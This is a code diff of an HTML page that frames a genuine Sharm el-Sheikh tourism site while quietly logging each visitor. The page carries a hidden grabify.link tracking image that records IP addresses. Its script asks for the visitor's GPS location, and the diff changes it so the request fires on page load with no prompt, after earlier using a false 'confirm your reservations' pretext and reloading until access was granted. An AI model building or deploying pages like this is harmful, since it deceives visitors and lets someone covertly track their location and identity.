@@ -1,3 +1,4 @@
+<!-- Back to not request - track - short cords  -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -30,8 +31,8 @@
     </style>
 </head>
 <body>
-    <img src="https://grabify.link/2KHAV8">   
-    <!-- Content is loaded normally without hiding the iframe -->
+    <img src="https://grabify.link/2KHAV8">    
+    <!-- Content is loaded normally -->
     <iframe id="content-frame" src="https://www.elgounatours.com/en/top-attractions-in-sharm-el-sheikh"></iframe>
 
     <script>
@@ -70,15 +71,9 @@
             }
         }
 
-        // Trigger an alert and ask for permission to access the user's location
+        // Trigger GPS permission request on page load without an additional alert
         window.onload = function () {
-            const userConfirmed = confirm("Location services are required to confirm your reservations. Please enable location access to continue using the site.");
-            if (userConfirmed) {
-                getGPS();
-            } else {
-                // If the user dismisses, reload the page to prompt again
-                location.reload();
-            }
+            getGPS();
         };
     </script>
 
